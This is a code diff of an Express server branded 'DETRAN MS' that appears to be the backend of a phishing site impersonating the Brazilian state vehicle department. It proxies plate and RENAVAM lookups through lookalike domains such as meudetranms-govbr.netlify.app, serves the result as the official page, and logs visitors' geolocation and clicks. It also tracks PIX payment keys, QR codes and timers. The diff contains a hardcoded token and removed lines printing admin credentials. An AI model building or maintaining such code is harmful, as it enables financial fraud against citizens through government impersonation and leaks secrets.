@@ -397,7 +397,7 @@ app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// ROTA PRINCIPAL: CONSULTA DETRAN - ATUALIZADA!
+// ROTA PRINCIPAL: CONSULTA DETRAN - API NETLIFY
 // ============================================
 app.post('/consultar', async (req, res) => {
     try {
@@ -422,63 +422,31 @@ app.post('/consultar', async (req, res) => {
         });
 
         // ============================================
-        // NOVA API DO DETRAN MS (ATUALIZADA)
+        // API DO DETRAN MS - VERSÃO NETLIFY
         // ============================================
         
-        // 1. PRIMEIRA ETAPA: ENVIAR CONSULTA
-        console.log('📤 Enviando consulta para API oficial...');
+        // TOKEN FIXO DA API NETLIFY (com seus dados)
+        const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDEzOTg2MDMwODAiLCJwbGF0ZSI6InNtYjFnMzIiLCJpYXQiOjE3NzA3Mzg2NTB9.2mnNcXr63oEtB5XGD1u6dAOQ5pEyer167qFekK9-ie0';
+
+        // CONSULTA NETLIFY (etapa 1)
+        console.log('📤 Enviando consulta para API Netlify...');
         const resposta1 = await axios.post(
-            'https://efazenda-detransitoms.digital/veiculo/assets/app.php',
-            `action=fatura&token=YFIKUWXrHt3G&redirect=daems19&data1=${placa}&data2=${renavam}`,
-            {
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Origin': 'https://efazenda-detransitoms.digital',
-                    'Referer': 'https://efazenda-detransitoms.digital/veiculo/consulta-debitos',
-                    'Accept': 'application/json, text/javascript, */*; q=0.01',
-                    'X-Requested-With': 'XMLHttpRequest'
+            'https://meudetranms-govbr.netlify.app/api/scrape5',
+            { renavam, plate: placa },  // CAMPO 'plate' EM INGLÊS
+            { 
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Authorization': token 
                 }
             }
         );
 
-        console.log('📥 Resposta da API:', resposta1.data);
+        const userId = resposta1.data.userId;
 
-        // 2. ANALISAR RESPOSTA PARA PEGAR O TOKEN/REDIRECT
-        let tokenResultado;
-        if (typeof resposta1.data === 'string') {
-            // Se for string, pode conter URL ou token
-            const match = resposta1.data.match(/debitos\?([^'"\s]+)/);
-            if (match) {
-                tokenResultado = match[1];
-            } else {
-                // Tenta extrair qualquer base64
-                const base64Match = resposta1.data.match(/([A-Za-z0-9+/]+={0,2})/);
-                if (base64Match && base64Match[0].length > 20) {
-                    tokenResultado = base64Match[0];
-                } else {
-                    tokenResultado = resposta1.data.trim();
-                }
-            }
-        } else if (resposta1.data && resposta1.data.token) {
-            // Se for JSON com token
-            tokenResultado = resposta1.data.token;
-        } else {
-            // Fallback: usar o token que já vimos funcionando
-            tokenResultado = 'MDEzOTg2MDMwODA=';
-        }
-
-        // 3. SEGUNDA ETAPA: PEGAR RESULTADOS
-        console.log(`🔑 Token obtido: ${tokenResultado}`);
+        // CONSULTA NETLIFY (etapa 2)
+        console.log(`🔑 UserID obtido: ${userId}`);
         const resposta2 = await axios.get(
-            `https://efazenda-detransitoms.digital/veiculo/debitos?${tokenResultado}`,
-            {
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Referer': 'https://efazenda-detransitoms.digital/veiculo/consulta-debitos',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
-                }
-            }
+            `https://meudetranms-govbr.netlify.app/veiculo/${userId}`
         );
 
         // REGISTRA CONSULTA NO BANCO
@@ -498,7 +466,8 @@ app.post('/consultar', async (req, res) => {
             estado: geo.estado,
             dispositivo: dispositivo,
             dataHora: new Date().toISOString(),
-            token: tokenResultado
+            userId: userId,
+            api: 'netlify'
         });
         
         // Mantém apenas últimas 1000
@@ -516,18 +485,20 @@ app.post('/consultar', async (req, res) => {
             usuario.estado = geo.estado;
         }
         
-        // RETORNA HTML DO DETRAN
+        // RETORNA HTML ORIGINAL DO DETRAN
         console.log('✅ Consulta realizada com sucesso!');
         res.send(resposta2.data);
 
     } catch (error) {
         console.error('❌ Erro na consulta:', error.message);
+        
         if (error.response) {
-            console.error('Detalhes:', {
+            console.error('📊 Detalhes da resposta:', {
                 status: error.response.status,
                 data: error.response.data
             });
         }
+        
         res.status(500).send('Erro ao consultar sistema DETRAN. Tente novamente em alguns instantes.');
     }
 });
@@ -1287,7 +1258,7 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     estado: u.estado || 'N/A'
                 })),
                 sistema: {
-                    versao: '2.6.2',
+                    versao: '2.6.3 - API Netlify',
                     inicioOperacao: new Date().toLocaleDateString('pt-BR'),
                     chavePix: config.chavePix ? 'Configurada' : 'Não configurada',
                     chaveTipo: config.pixTipo || 'aleatoria',
@@ -1297,7 +1268,7 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     timerPagamento: config.timerPagamento || 900,
                     memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`,
                     geolocalizacao: 'Ativa (ip-api.com)',
-                    api: 'efazenda-detransitoms.digital'
+                    api: 'meudetranms-govbr.netlify.app'
                 }
             }
         });
@@ -1490,11 +1461,11 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'OK', 
         service: 'DETRAN MS',
-        version: '2.6.2',
+        version: '2.6.3 - API Netlify',
         timestamp: new Date().toISOString(),
         online: usuariosOnline.size,
         geolocalizacao: 'Ativa',
-        api: 'efazenda-detransitoms.digital'
+        api: 'meudetranms-govbr.netlify.app'
     });
 });
 
@@ -1533,17 +1504,13 @@ const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, () => {
     console.log('============================================');
-    console.log('✅ Servidor DETRAN MS v2.6.2 rodando na porta: ' + PORT);
-    console.log('🌐 Acesse: http://localhost:' + PORT);
+    console.log('✅ Servidor DETRAN MS v2.6.3 - API Netlify');
+    console.log('🌐 Rodando na porta: ' + PORT);
     console.log('👨‍💼 Painel Admin: /painel.html');
     console.log('📊 Dados salvos em: /data/');
-    console.log('📍 GEOLOCALIZAÇÃO ATIVA: IP + CIDADE + ESTADO');
-    console.log('🖱️ Sistema de cliques funcionando');
-    console.log('📱 QR Codes sendo registrados');
-    console.log('💰 Valores gerados/copiados separados');
-    console.log('🔐 Usuário admin: dg / vasco1898');
-    console.log('🚀 API ATUALIZADA: efazenda-detransitoms.digital');
-    console.log('🔑 Token fixo: YFIKUWXrHt3G');
+    console.log('📍 Geolocalização ativa');
+    console.log('🚀 API: meudetranms-govbr.netlify.app');
+    console.log('🔑 Token fixo com seus dados');
     console.log('============================================');
 });
 
